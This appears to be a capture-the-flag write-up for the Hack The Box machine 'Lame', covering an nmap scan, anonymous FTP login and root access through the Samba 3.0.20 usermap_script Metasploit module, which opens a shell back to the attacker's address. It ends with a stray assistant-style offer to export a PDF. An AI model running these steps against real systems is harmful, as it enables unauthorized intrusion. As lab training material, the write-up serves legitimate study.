# Hack The Box - Lame Write-Up
You can access the machine [here](https://www.hackthebox.com/machines/Lame) on Hack The Box.

````markdown
- **Target IP:** `10.10.10.3`

---

## 🌐 Initial Scanning

1. **Ping the target to check if it's alive:**
   ```bash
   ping 10.10.10.3
````

2. **Performed an Nmap scan:**

   ```bash
   nmap -sT -Pn -A 10.10.10.3
   ```

   **Nmap Results:**

   * **FTP (21/tcp)**: vsftpd 2.3.4 (Anonymous login allowed)
   * **SSH (22/tcp)**: OpenSSH 4.7p1
   * **SMB (139/tcp)**: Samba 3.0.20-Debian

---

## 🔎 Enumeration

### FTP

* Anonymous login was allowed:

  ```bash
  ftp 10.10.10.3
  ```

  * Logged in as `ftp`, but no useful files were found.

### SMB

* Samba version `3.0.20` was identified.
* Searched for known vulnerabilities and found it was **vulnerable to remote code execution**.

---

## 💥 Exploitation

* Found a matching exploit on [Exploit-DB](https://www.exploit-db.com/16320) and confirmed it was available in **Metasploit**.


* Launched Metasploit and used the `usermap_script` exploit:

  ```bash
  use exploit/multi/samba/usermap_script
  set RHOST "htb vm ip"
  set lhost "htbvpn ip"
  set lport 4444 #any port
  run
  ```

* Gained a **root shell** successfully.

---

## 🏁 Post Exploitation

* Verified root access with:

  ```bash
  id
  ```

  * Output: `root`

* Retrieved the user and root flag.

---

**Status:** ✅ Root access obtained via Samba RCE vulnerability.

```

Let me know if you want this exported as a PDF or if you’d like to make it into a general HTB exploit report template!
```
